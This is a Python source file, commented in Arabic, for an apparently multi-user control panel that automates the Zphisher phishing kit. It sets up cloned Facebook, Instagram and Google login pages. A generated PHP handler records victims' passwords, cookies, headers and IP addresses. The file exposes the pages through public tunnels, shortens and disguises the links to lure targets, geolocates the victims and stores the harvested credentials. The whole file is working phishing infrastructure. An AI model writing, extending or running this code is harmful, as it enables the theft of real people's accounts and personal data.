"""
🎣 واجهة التحكم المتقدمة في Zphisher
تدعم التحكم الكامل في جميع وظائف Zphisher مع تحسينات إضافية
"""

import os
import asyncio
import subprocess
import psutil
import json
import uuid
import shutil
import logging
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass

from ..config import settings, zphisher_sites
from ..database import db_manager, Session as DBSession
from .url_shortener import url_shortener, url_masker
from .file_monitor import file_monitor

logger = logging.getLogger(__name__)

@dataclass
class ZphisherSession:
    """فئة تمثل جلسة Zphisher"""
    session_id: str
    site_type: str
    site_variant: Optional[str]
    tunnel_type: str
    custom_port: Optional[int]
    custom_mask: Optional[str]
    user_id: int
    status: str
    local_url: Optional[str] = None
    public_url: Optional[str] = None
    short_url: Optional[str] = None
    masked_url: Optional[str] = None
    server_process: Optional[subprocess.Popen] = None
    tunnel_process: Optional[subprocess.Popen] = None
    monitoring_task: Optional[asyncio.Task] = None
    created_at: datetime = None
    
    def __post_init__(self):
        if self.created_at is None:
            self.created_at = datetime.utcnow()

class ZphisherController:
    """المتحكم الرئيسي في Zphisher مع جميع الوظائف المتقدمة"""
    
    def __init__(self):
        self.active_sessions: Dict[str, ZphisherSession] = {}
        self.base_path = Path(settings.ZPHISHER_PATH).parent
        self.sites_path = Path(settings.ZPHISHER_SITES_PATH)
        self.auth_path = Path(settings.ZPHISHER_AUTH_PATH)
        self.server_path = Path(settings.ZPHISHER_SERVER_PATH)
        
        # التأكد من وجود المجلدات المطلوبة
        self._ensure_directories()
    
    def _ensure_directories(self):
        """التأكد من وجود جميع المجلدات المطلوبة"""
        required_dirs = [
            self.auth_path,
            self.server_path,
            self.server_path / "www"
        ]
        
        for dir_path in required_dirs:
            dir_path.mkdir(parents=True, exist_ok=True)
    
    async def create_session(
        self,
        user_id: int,
        site_type: str,
        tunnel_type: str,
        site_variant: Optional[str] = None,
        custom_port: Optional[int] = None,
        custom_mask: Optional[str] = None
    ) -> ZphisherSession:
        """إنشاء جلسة تصيد جديدة"""
        
        try:
            # التحقق من صحة نوع الموقع
            if not self._validate_site_type(site_type, site_variant):
                raise ValueError(f"نوع موقع غير مدعوم: {site_type}")
            
            # التحقق من صحة نوع النفق
            if tunnel_type not in ["localhost", "cloudflared", "localxpose"]:
                raise ValueError(f"نوع نفق غير مدعوم: {tunnel_type}")
            
            # إنشاء معرف جلسة فريد
            session_id = str(uuid.uuid4())
            
            # إنشاء كائن الجلسة
            session = ZphisherSession(
                session_id=session_id,
                site_type=site_type,
                site_variant=site_variant,
                tunnel_type=tunnel_type,
                custom_port=custom_port,
                custom_mask=custom_mask,
                user_id=user_id,
                status="preparing"
            )
            
            # حفظ الجلسة
            self.active_sessions[session_id] = session
            
            # حفظ في قاعدة البيانات
            await self._save_session_to_db(session)
            
            logger.info(f"تم إنشاء جلسة جديدة: {session_id}")
            
            return session
            
        except Exception as e:
            logger.error(f"خطأ في إنشاء جلسة التصيد: {e}")
            raise
    
    async def start_session(self, session_id: str) -> bool:
        """بدء تشغيل جلسة التصيد"""
        
        if session_id not in self.active_sessions:
            raise ValueError(f"جلسة غير موجودة: {session_id}")
        
        session = self.active_sessions[session_id]
        
        try:
            # تحديث حالة الجلسة
            session.status = "starting"
            await db_manager.update_session_status(session_id, "starting")
            
            # إعداد الموقع
            await self._setup_site(session)
            
            # بدء خادم PHP
            await self._start_php_server(session)
            
            # بدء النفق
            await self._start_tunnel(session)
            
            # بدء مراقبة الملفات
            session_data_path = self.server_path / "www"
            await file_monitor.start_monitoring_session(session.session_id, session_data_path)
            
            # بدء المراقبة
            session.monitoring_task = asyncio.create_task(
                self._monitor_session(session)
            )
            
            # تحديث حالة الجلسة
            session.status = "active"
            await db_manager.update_session_status(
                session_id, 
                "active",
                started_at=datetime.utcnow(),
                local_url=session.local_url,
                public_url=session.public_url,
                short_url=session.short_url,
                masked_url=session.masked_url
            )
            
            logger.info(f"تم بدء الجلسة بنجاح: {session_id}")
            return True
            
        except Exception as e:
            logger.error(f"خطأ في بدء الجلسة {session_id}: {e}")
            session.status = "error"
            await db_manager.update_session_status(session_id, "error")
            return False
    
    async def stop_session(self, session_id: str) -> bool:
        """إيقاف جلسة التصيد"""
        
        if session_id not in self.active_sessions:
            return False
        
        session = self.active_sessions[session_id]
        
        try:
            session.status = "stopping"
            await db_manager.update_session_status(session_id, "stopping")
            
            # إيقاف مراقبة الملفات
            await file_monitor.stop_monitoring_session(session_id)
            
            # إيقاف المراقبة
            if session.monitoring_task:
                session.monitoring_task.cancel()
                try:
                    await session.monitoring_task
                except asyncio.CancelledError:
                    pass
            
            # إيقاف العمليات
            await self._stop_processes(session)
            
            # تنظيف الملفات المؤقتة
            await self._cleanup_session_files(session)
            
            # تحديث حالة الجلسة
            session.status = "stopped"
            await db_manager.update_session_status(
                session_id, 
                "stopped",
                stopped_at=datetime.utcnow()
            )
            
            # إزالة من الذاكرة
            del self.active_sessions[session_id]
            
            logger.info(f"تم إيقاف الجلسة: {session_id}")
            return True
            
        except Exception as e:
            logger.error(f"خطأ في إيقاف الجلسة {session_id}: {e}")
            return False
    
    async def get_session_status(self, session_id: str) -> Optional[Dict[str, Any]]:
        """الحصول على حالة الجلسة التفصيلية"""
        
        if session_id not in self.active_sessions:
            # البحث في قاعدة البيانات
            db_session = await db_manager.get_session_by_id(session_id)
            if db_session:
                return db_session.to_dict()
            return None
        
        session = self.active_sessions[session_id]
        
        # فحص حالة العمليات
        php_running = self._is_process_running(session.server_process)
        tunnel_running = self._is_process_running(session.tunnel_process)
        
        # إحصائيات إضافية
        captured_data = await db_manager.get_session_captured_data(session_id)
        
        return {
            "session_id": session_id,
            "site_type": session.site_type,
            "site_variant": session.site_variant,
            "tunnel_type": session.tunnel_type,
            "status": session.status,
            "local_url": session.local_url,
            "public_url": session.public_url,
            "short_url": session.short_url,
            "masked_url": session.masked_url,
            "php_server_running": php_running,
            "tunnel_running": tunnel_running,
            "total_captures": len(captured_data),
            "created_at": session.created_at.isoformat(),
            "uptime": str(datetime.utcnow() - session.created_at)
        }
    
    async def get_active_sessions(self) -> List[Dict[str, Any]]:
        """الحصول على جميع الجلسات النشطة"""
        sessions = []
        
        for session_id, session in self.active_sessions.items():
            status = await self.get_session_status(session_id)
            if status:
                sessions.append(status)
        
        return sessions
    
    async def _setup_site(self, session: ZphisherSession) -> None:
        """إعداد ملفات الموقع المزيف"""
        
        # تحديد مجلد الموقع المصدر
        site_key = session.site_variant or session.site_type
        source_path = self.sites_path / site_key
        
        if not source_path.exists():
            raise FileNotFoundError(f"مجلد الموقع غير موجود: {source_path}")
        
        # تنظيف مجلد الوجهة
        www_path = self.server_path / "www"
        if www_path.exists():
            shutil.rmtree(www_path)
        www_path.mkdir(parents=True, exist_ok=True)
        
        # نسخ ملفات الموقع
        shutil.copytree(source_path, www_path, dirs_exist_ok=True)
        
        # نسخ ملف تسجيل IP
        ip_php_source = self.sites_path / "ip.php"
        if ip_php_source.exists():
            shutil.copy2(ip_php_source, www_path / "ip.php")
        
        # إنشاء ملف PHP مخصص لمعالجة البيانات
        await self._create_custom_php_handler(session, www_path)
        
        logger.info(f"تم إعداد الموقع: {site_key}")
    
    async def _create_custom_php_handler(self, session: ZphisherSession, www_path: Path) -> None:
        """إنشاء معالج PHP مخصص لتسجيل البيانات"""
        
        handler_content = f'''<?php
// معالج مخصص لجلسة {session.session_id}
session_start();

// تسجيل IP
if(isset($_SERVER['HTTP_CLIENT_IP'])) {{
    $ipaddr = $_SERVER['HTTP_CLIENT_IP'];
}} elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {{
    $ipaddr = $_SERVER['HTTP_X_FORWARDED_FOR'];
}} else {{
    $ipaddr = $_SERVER['REMOTE_ADDR'];
}}

if(strpos($ipaddr,',') !== false) {{
    $ipaddr = preg_split("/\\,/", $ipaddr)[0];
}}

// معلومات الطلب
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$timestamp = date('Y-m-d H:i:s');

// تسجيل زيارة
$visit_data = [
    'session_id' => '{session.session_id}',
    'ip_address' => $ipaddr,
    'user_agent' => $user_agent,
    'referer' => $referer,
    'timestamp' => $timestamp,
    'method' => $_SERVER['REQUEST_METHOD'],
    'uri' => $_SERVER['REQUEST_URI']
];

file_put_contents('visits.json', json_encode($visit_data) . "\\n", FILE_APPEND | LOCK_EX);

// معالجة بيانات النماذج
if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
    $form_data = $_POST;
    
    // تنظيف وتجهيز البيانات
    $credentials = [
        'session_id' => '{session.session_id}',
        'ip_address' => $ipaddr,
        'user_agent' => $user_agent,
        'referer' => $referer,
        'timestamp' => $timestamp,
        'form_data' => $form_data,
        'cookies' => $_COOKIE,
        'headers' => getallheaders()
    ];
    
    // حفظ البيانات
    file_put_contents('captured_data.json', json_encode($credentials) . "\\n", FILE_APPEND | LOCK_EX);
    
    // إعادة التوجيه (يمكن تخصيصها)
    $redirect_url = 'https://{session.site_type}.com/';
    header("Location: $redirect_url");
    exit();
}}
?>'''
        
        # حفظ الملف
        handler_path = www_path / "custom_handler.php"
        with open(handler_path, 'w', encoding='utf-8') as f:
            f.write(handler_content)
        
        # تعديل ملفات النماذج لاستخدام المعالج المخصص
        await self._modify_form_actions(www_path)
    
    async def _modify_form_actions(self, www_path: Path) -> None:
        """تعديل ملفات HTML لاستخدام المعالج المخصص"""
        
        html_files = list(www_path.glob("*.html"))
        
        for html_file in html_files:
            try:
                with open(html_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # تعديل action النماذج
                content = content.replace(
                    'action="login.php"', 
                    'action="custom_handler.php"'
                )
                content = content.replace(
                    "action='login.php'", 
                    "action='custom_handler.php'"
                )
                
                with open(html_file, 'w', encoding='utf-8') as f:
                    f.write(content)
                    
            except Exception as e:
                logger.warning(f"خطأ في تعديل ملف HTML {html_file}: {e}")
    
    async def _start_php_server(self, session: ZphisherSession) -> None:
        """بدء خادم PHP المحلي"""
        
        # تحديد المنفذ
        port = session.custom_port or self._find_available_port()
        host = "127.0.0.1"
        
        # إعداد الأوامر
        www_path = self.server_path / "www"
        cmd = [
            "php", "-S", f"{host}:{port}",
            "-t", str(www_path)
        ]
        
        try:
            # بدء العملية
            session.server_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=str(www_path)
            )
            
            # انتظار بدء الخادم
            await asyncio.sleep(2)
            
            # التحقق من حالة العملية
            if session.server_process.poll() is not None:
                stderr = session.server_process.stderr.read().decode()
                raise RuntimeError(f"فشل في بدء خادم PHP: {stderr}")
            
            session.local_url = f"http://{host}:{port}"
            
            logger.info(f"تم بدء خادم PHP على: {session.local_url}")
            
        except Exception as e:
            logger.error(f"خطأ في بدء خادم PHP: {e}")
            raise
    
    async def _start_tunnel(self, session: ZphisherSession) -> None:
        """بدء نفق الشبكة"""
        
        if session.tunnel_type == "localhost":
            # لا نحتاج نفق للـ localhost
            session.public_url = session.local_url
            session.short_url = session.local_url
            session.masked_url = session.custom_mask or session.local_url
            return
        
        elif session.tunnel_type == "cloudflared":
            await self._start_cloudflared(session)
            
        elif session.tunnel_type == "localxpose":
            await self._start_localxpose(session)
        
        # إنشاء روابط مختصرة ومقنعة
        await self._generate_urls(session)
    
    async def _start_cloudflared(self, session: ZphisherSession) -> None:
        """بدء نفق Cloudflared"""
        
        cloudflared_path = Path(settings.CLOUDFLARED_PATH)
        
        if not cloudflared_path.exists():
            raise FileNotFoundError("Cloudflared غير مثبت")
        
        cmd = [
            str(cloudflared_path),
            "tunnel",
            "--url", session.local_url,
            "--logfile", str(self.server_path / ".cld.log")
        ]
        
        try:
            session.tunnel_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # انتظار إنشاء النفق
            await asyncio.sleep(8)
            
            # قراءة الرابط من ملف السجل
            log_file = self.server_path / ".cld.log"
            if log_file.exists():
                with open(log_file, 'r') as f:
                    log_content = f.read()
                
                # البحث عن الرابط
                import re
                url_match = re.search(r'https://[a-z0-9-]+\.trycloudflare\.com', log_content)
                if url_match:
                    session.public_url = url_match.group()
                    logger.info(f"تم إنشاء نفق Cloudflared: {session.public_url}")
                else:
                    raise RuntimeError("فشل في الحصول على رابط Cloudflared")
            else:
                raise RuntimeError("ملف سجل Cloudflared غير موجود")
                
        except Exception as e:
            logger.error(f"خطأ في بدء Cloudflared: {e}")
            raise
    
    async def _start_localxpose(self, session: ZphisherSession) -> None:
        """بدء نفق LocalXpose"""
        
        localxpose_path = Path(settings.LOCALXPOSE_PATH)
        
        if not localxpose_path.exists():
            raise FileNotFoundError("LocalXpose غير مثبت")
        
        # استخراج المنفذ من الرابط المحلي
        port = session.local_url.split(':')[-1]
        
        cmd = [
            str(localxpose_path),
            "tunnel",
            "--raw-mode", "http",
            "--https-redirect",
            "-t", f"127.0.0.1:{port}"
        ]
        
        try:
            session.tunnel_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # انتظار إنشاء النفق
            await asyncio.sleep(12)
            
            # قراءة الرابط من مخرجات العملية
            output_file = self.server_path / ".loclx"
            if output_file.exists():
                with open(output_file, 'r') as f:
                    output_content = f.read()
                
                # البحث عن الرابط
                import re
                url_match = re.search(r'[0-9a-zA-Z.]*\.loclx\.io', output_content)
                if url_match:
                    session.public_url = f"https://{url_match.group()}"
                    logger.info(f"تم إنشاء نفق LocalXpose: {session.public_url}")
                else:
                    raise RuntimeError("فشل في الحصول على رابط LocalXpose")
            else:
                raise RuntimeError("ملف مخرجات LocalXpose غير موجود")
                
        except Exception as e:
            logger.error(f"خطأ في بدء LocalXpose: {e}")
            raise
    
    async def _generate_urls(self, session: ZphisherSession) -> None:
        """إنشاء روابط مختصرة ومقنعة للجلسة"""
        
        try:
            if not session.public_url:
                return
            
            # إنشاء رابط مختصر باستخدام خدمات حقيقية
            short_result = await url_shortener.shorten_url(session.public_url)
            if short_result.get('success'):
                session.short_url = short_result['short_url']
                logger.info(f"تم اختصار الرابط بـ {short_result.get('service', 'Unknown')}")
            else:
                # استخدام نظام احتياطي
                session.short_url = await self._shorten_url(session.public_url)
            
            # إنشاء رابط مقنع متقدم
            if session.custom_mask:
                session.masked_url = f"{session.custom_mask}@{session.short_url or session.public_url}"
            else:
                target_url = session.short_url or session.public_url
                session.masked_url = url_masker.create_social_engineering_url(target_url, session.site_type)
            
            # حفظ معلومات الروابط
            await self._save_url_info(session)
            
            logger.info(f"تم إنشاء الروابط للجلسة: {session.session_id}")
            
        except Exception as e:
            logger.error(f"خطأ في إنشاء الروابط: {e}")
    
    async def _save_url_info(self, session: ZphisherSession) -> None:
        """حفظ معلومات الروابط في قاعدة البيانات"""
        
        try:
            url_info = {
                'session_id': session.session_id,
                'original_url': session.public_url,
                'short_url': session.short_url,
                'masked_url': session.masked_url,
                'created_at': datetime.utcnow().isoformat()
            }
            
            # حفظ في ملف JSON للمراجعة
            urls_file = self.server_path / f"session_{session.session_id}_urls.json"
            import aiofiles
            async with aiofiles.open(urls_file, 'w') as f:
                await f.write(json.dumps(url_info, indent=2))
            
        except Exception as e:
            logger.error(f"خطأ في حفظ معلومات الروابط: {e}")
    
    async def _shorten_url(self, url: str) -> Optional[str]:
        """اختصار الرابط باستخدام خدمة مجانية"""
        
        import aiohttp
        
        # خدمات الاختصار المجانية
        services = [
            {
                'url': 'https://is.gd/create.php',
                'params': {'format': 'simple', 'url': url}
            },
            {
                'url': 'https://tinyurl.com/api-create.php',
                'params': {'url': url}
            }
        ]
        
        for service in services:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(service['url'], params=service['params']) as response:
                        if response.status == 200:
                            short_url = await response.text()
                            if short_url.startswith('http'):
                                return short_url.strip()
            except:
                continue
        
        return None
    
    async def _monitor_session(self, session: ZphisherSession) -> None:
        """مراقبة الجلسة وتحديث البيانات"""
        
        while session.status == "active":
            try:
                # فحص ملفات البيانات الجديدة
                await self._check_captured_data(session)
                
                # فحص حالة العمليات
                if not self._is_process_running(session.server_process):
                    logger.warning(f"خادم PHP متوقف للجلسة: {session.session_id}")
                    session.status = "error"
                    break
                
                if session.tunnel_process and not self._is_process_running(session.tunnel_process):
                    logger.warning(f"نفق الشبكة متوقف للجلسة: {session.session_id}")
                
                # انتظار قبل الفحص التالي
                await asyncio.sleep(5)
                
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"خطأ في مراقبة الجلسة {session.session_id}: {e}")
                await asyncio.sleep(10)
    
    async def _check_captured_data(self, session: ZphisherSession) -> None:
        """فحص البيانات المُلتقطة الجديدة"""
        
        www_path = self.server_path / "www"
        
        # فحص ملف البيانات
        data_file = www_path / "captured_data.json"
        if data_file.exists():
            try:
                with open(data_file, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                
                # معالجة كل سطر (كل سطر = بيانات مُلتقطة)
                for line in lines:
                    if line.strip():
                        try:
                            data = json.loads(line.strip())
                            await self._process_captured_data(session, data)
                        except json.JSONDecodeError:
                            continue
                
                # حذف الملف بعد المعالجة
                data_file.unlink()
                
            except Exception as e:
                logger.error(f"خطأ في معالجة البيانات المُلتقطة: {e}")
        
        # فحص ملف الزيارات
        visits_file = www_path / "visits.json"
        if visits_file.exists():
            try:
                with open(visits_file, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                
                # تحديث عداد الزوار
                for line in lines:
                    if line.strip():
                        await db_manager.increment_session_visitors(session.session_id)
                
                # حذف الملف بعد المعالجة
                visits_file.unlink()
                
            except Exception as e:
                logger.error(f"خطأ في معالجة ملف الزيارات: {e}")
    
    async def _process_captured_data(self, session: ZphisherSession, data: Dict[str, Any]) -> None:
        """معالجة البيانات المُلتقطة وحفظها في قاعدة البيانات"""
        
        try:
            # استخراج البيانات المهمة
            form_data = data.get('form_data', {})
            
            # تحديد نوع البيانات حسب الموقع
            username = None
            password = None
            email = None
            phone = None
            
            # استخراج بيانات الاعتماد حسب الموقع
            if session.site_type in ['facebook', 'fb_advanced', 'fb_security', 'fb_messenger']:
                username = form_data.get('email') or form_data.get('username')
                password = form_data.get('pass') or form_data.get('password')
                
            elif session.site_type in ['instagram', 'ig_followers', 'insta_followers', 'ig_verify']:
                username = form_data.get('username')
                password = form_data.get('password')
                
            elif session.site_type in ['google', 'google_new', 'google_poll']:
                email = form_data.get('email') or form_data.get('identifier')
                password = form_data.get('password') or form_data.get('passwd')
                
            else:
                # مواقع أخرى - استخراج عام
                username = (form_data.get('username') or 
                          form_data.get('email') or 
                          form_data.get('user') or
                          form_data.get('login'))
                password = (form_data.get('password') or 
                          form_data.get('pass') or
                          form_data.get('pwd'))
                email = form_data.get('email')
                phone = form_data.get('phone') or form_data.get('mobile')
            
            # تحليل معلومات الجهاز والمتصفح
            user_agent = data.get('user_agent', '')
            device_info = self._analyze_user_agent(user_agent)
            
            # تحليل الموقع الجغرافي (إذا كان متاحاً)
            geo_info = await self._analyze_ip_location(data.get('ip_address'))
            
            # إنشاء بيانات مُلتقطة جديدة
            captured_data = {
                'session_id': session.session_id,
                'ip_address': data.get('ip_address'),
                'user_agent': user_agent,
                'referer': data.get('referer'),
                'username': username,
                'password': password,
                'email': email,
                'phone': phone,
                'form_data': form_data,
                'cookies': data.get('cookies'),
                'headers': data.get('headers'),
                'country': geo_info.get('country'),
                'city': geo_info.get('city'),
                'isp': geo_info.get('isp'),
                'device_type': device_info.get('device_type'),
                'browser': device_info.get('browser'),
                'os': device_info.get('os'),
                'capture_method': 'form',
                'is_verified': False,
                'confidence_score': 'medium'
            }
            
            # حفظ في قاعدة البيانات
            await db_manager.create_captured_data(captured_data)
            
            logger.info(f"تم حفظ بيانات مُلتقطة جديدة للجلسة: {session.session_id}")
            
        except Exception as e:
            logger.error(f"خطأ في معالجة البيانات المُلتقطة: {e}")
    
    def _analyze_user_agent(self, user_agent: str) -> Dict[str, str]:
        """تحليل User Agent لاستخراج معلومات الجهاز"""
        
        try:
            import user_agents
            parsed_ua = user_agents.parse(user_agent)
            
            return {
                'device_type': 'mobile' if parsed_ua.is_mobile else 'desktop',
                'browser': f"{parsed_ua.browser.family} {parsed_ua.browser.version_string}",
                'os': f"{parsed_ua.os.family} {parsed_ua.os.version_string}"
            }
        except:
            # تحليل بسيط إذا فشلت المكتبة
            device_type = 'mobile' if any(x in user_agent.lower() for x in ['mobile', 'android', 'iphone']) else 'desktop'
            browser = 'unknown'
            os = 'unknown'
            
            if 'chrome' in user_agent.lower():
                browser = 'Chrome'
            elif 'firefox' in user_agent.lower():
                browser = 'Firefox'
            elif 'safari' in user_agent.lower():
                browser = 'Safari'
            
            if 'windows' in user_agent.lower():
                os = 'Windows'
            elif 'mac' in user_agent.lower():
                os = 'macOS'
            elif 'linux' in user_agent.lower():
                os = 'Linux'
            elif 'android' in user_agent.lower():
                os = 'Android'
            elif 'ios' in user_agent.lower():
                os = 'iOS'
            
            return {
                'device_type': device_type,
                'browser': browser,
                'os': os
            }
    
    async def _analyze_ip_location(self, ip_address: str) -> Dict[str, str]:
        """تحليل الموقع الجغرافي لعنوان IP"""
        
        if not ip_address or ip_address in ['127.0.0.1', 'localhost']:
            return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown'}
        
        try:
            # استخدام خدمة مجانية للتحليل الجغرافي
            import aiohttp
            
            async with aiohttp.ClientSession() as session:
                url = f"http://ip-api.com/json/{ip_address}"
                async with session.get(url) as response:
                    if response.status == 200:
                        data = await response.json()
                        return {
                            'country': data.get('country', 'Unknown'),
                            'city': data.get('city', 'Unknown'),
                            'isp': data.get('isp', 'Unknown')
                        }
        except:
            pass
        
        return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown'}
    
    def _validate_site_type(self, site_type: str, site_variant: Optional[str] = None) -> bool:
        """التحقق من صحة نوع الموقع"""
        
        all_sites = zphisher_sites.get_all_sites()
        
        if site_type not in all_sites:
            return False
        
        site_info = all_sites[site_type]
        
        # إذا كان الموقع له أشكال متعددة
        if 'variants' in site_info:
            if site_variant:
                variant_keys = [v['key'] for v in site_info['variants']]
                return site_variant in variant_keys
            else:
                # إذا لم يتم تحديد شكل، استخدم الأول
                return True
        
        return True
    
    def _find_available_port(self, start_port: int = 8080) -> int:
        """البحث عن منفذ متاح"""
        
        import socket
        
        for port in range(start_port, start_port + 100):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.bind(('127.0.0.1', port))
                    return port
            except OSError:
                continue
        
        raise RuntimeError("لا يوجد منفذ متاح")
    
    def _is_process_running(self, process: Optional[subprocess.Popen]) -> bool:
        """فحص ما إذا كانت العملية تعمل"""
        
        if not process:
            return False
        
        try:
            return process.poll() is None
        except:
            return False
    
    async def _stop_processes(self, session: ZphisherSession) -> None:
        """إيقاف جميع العمليات المرتبطة بالجلسة"""
        
        processes = [session.server_process, session.tunnel_process]
        
        for process in processes:
            if process and self._is_process_running(process):
                try:
                    process.terminate()
                    await asyncio.sleep(2)
                    
                    if self._is_process_running(process):
                        process.kill()
                        
                except Exception as e:
                    logger.warning(f"خطأ في إيقاف العملية: {e}")
    
    async def _cleanup_session_files(self, session: ZphisherSession) -> None:
        """تنظيف الملفات المؤقتة للجلسة"""
        
        try:
            # تنظيف ملفات السجل
            log_files = [
                self.server_path / ".cld.log",
                self.server_path / ".loclx"
            ]
            
            for log_file in log_files:
                if log_file.exists():
                    log_file.unlink()
            
            # تنظيف مجلد www
            www_path = self.server_path / "www"
            if www_path.exists():
                shutil.rmtree(www_path)
                
        except Exception as e:
            logger.warning(f"خطأ في تنظيف ملفات الجلسة: {e}")
    
    async def _save_session_to_db(self, session: ZphisherSession) -> None:
        """حفظ الجلسة في قاعدة البيانات"""
        
        session_data = {
            'session_id': session.session_id,
            'user_id': session.user_id,
            'site_type': session.site_type,
            'site_variant': session.site_variant,
            'tunnel_type': session.tunnel_type,
            'custom_port': session.custom_port,
            'custom_mask': session.custom_mask,
            'status': session.status
        }
        
        await db_manager.create_session(session_data)

class SessionManager:
    """مدير الجلسات المتقدم"""
    
    def __init__(self):
        self.controller = ZphisherController()
    
    async def create_and_start_session(
        self,
        user_id: int,
        site_type: str,
        tunnel_type: str,
        **kwargs
    ) -> Tuple[bool, str, Optional[ZphisherSession]]:
        """إنشاء وبدء جلسة في خطوة واحدة"""
        
        try:
            # إنشاء الجلسة
            session = await self.controller.create_session(
                user_id=user_id,
                site_type=site_type,
                tunnel_type=tunnel_type,
                **kwargs
            )
            
            # بدء الجلسة
            success = await self.controller.start_session(session.session_id)
            
            if success:
                return True, "تم إنشاء وبدء الجلسة بنجاح", session
            else:
                return False, "فشل في بدء الجلسة", None
                
        except Exception as e:
            error_msg = f"خطأ في إنشاء الجلسة: {str(e)}"
            logger.error(error_msg)
            return False, error_msg, None
    
    async def get_user_active_sessions(self, user_id: int) -> List[Dict[str, Any]]:
        """الحصول على الجلسات النشطة للمستخدم"""
        
        all_sessions = await self.controller.get_active_sessions()
        user_sessions = [
            session for session in all_sessions 
            if session.get('user_id') == user_id
        ]
        
        return user_sessions
    
    async def stop_all_user_sessions(self, user_id: int) -> int:
        """إيقاف جميع جلسات المستخدم"""
        
        user_sessions = await self.get_user_active_sessions(user_id)
        stopped_count = 0
        
        for session in user_sessions:
            session_id = session['session_id']
            if await self.controller.stop_session(session_id):
                stopped_count += 1
        
        return stopped_count

# مثيلات عامة
zphisher_controller = ZphisherController()
session_manager = SessionManager()